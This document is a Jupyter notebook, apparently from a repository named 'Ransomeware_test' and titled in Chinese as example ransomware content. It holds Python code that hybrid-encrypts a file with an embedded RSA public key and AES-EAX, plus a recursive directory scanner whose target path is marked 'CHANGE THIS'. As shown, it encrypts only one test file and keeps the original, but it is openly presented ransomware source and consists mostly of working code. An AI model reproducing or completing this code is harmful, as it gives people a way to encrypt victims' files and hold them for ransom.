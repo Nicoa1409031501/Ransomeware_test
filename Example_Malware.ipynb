{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 範例用勒索軟體的內容"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 加密檔案"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "import base64\n",
    "import os\n",
    "from Crypto.PublicKey import RSA\n",
    "from Crypto.Cipher import PKCS1_OAEP, AES\n",
    "\n",
    "'''\n",
    "with open('public.pem', 'rb') as f:\n",
    "    public = f.read()\n",
    "print(base64.b64encode(public))\n",
    "'''\n",
    "\n",
    "# public key with base64 encoding\n",
    "pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''\n",
    "pubKey = base64.b64decode(pubKey)\n",
    "\n",
    "\n",
    "def scanRecurse(baseDir):\n",
    "    '''\n",
    "    Scan a directory and return a list of all files\n",
    "    return: list of files\n",
    "    '''\n",
    "    for entry in os.scandir(baseDir):\n",
    "        if entry.is_file():\n",
    "            yield entry\n",
    "        else:\n",
    "            yield from scanRecurse(entry.path)\n",
    "\n",
    "\n",
    "def encrypt(dataFile, publicKey):\n",
    "    '''\n",
    "    use EAX mode to allow detection of unauthorized modifications\n",
    "    '''\n",
    "    # read data from file\n",
    "    with open(dataFile, 'rb') as f:\n",
    "        data = f.read()\n",
    "    \n",
    "    # convert data to bytes\n",
    "    data = bytes(data)\n",
    "\n",
    "    # create public key object\n",
    "    key = RSA.import_key(publicKey)\n",
    "    sessionKey = os.urandom(16)\n",
    "\n",
    "    # encrypt the session key with the public key\n",
    "    cipher = PKCS1_OAEP.new(key)\n",
    "    encryptedSessionKey = cipher.encrypt(sessionKey)\n",
    "\n",
    "    # encrypt the data with the session key\n",
    "    cipher = AES.new(sessionKey, AES.MODE_EAX)\n",
    "    ciphertext, tag = cipher.encrypt_and_digest(data)\n",
    "\n",
    "    # save the encrypted data to file\n",
    "    [ fileName, fileExtension ] = dataFile.split('.')\n",
    "    encryptedFile = fileName + '_encrypted.' + fileExtension\n",
    "    with open(encryptedFile, 'wb') as f:\n",
    "        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]\n",
    "    print('Encrypted file saved to ' + encryptedFile)\n",
    "\n",
    "fileName = 'test.txt'\n",
    "encrypt(fileName, pubKey)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 遍歷目錄"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "from pathlib import Path\n",
    "\n",
    "def scanRecurse(baseDir):\n",
    "    for entry in os.scandir(baseDir):\n",
    "        if entry.is_file():\n",
    "            yield entry\n",
    "        else:\n",
    "            yield from scanRecurse(entry.path)\n",
    "            \n",
    "\n",
    "\n",
    "\n",
    "directory = '../' # CHANGE THIS\n",
    "try:\n",
    "    for item in scanRecurse(directory): \n",
    "        filePath = Path(item)\n",
    "        fileType = filePath.suffix.lower()\n",
    "except:\n",
    "    12"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
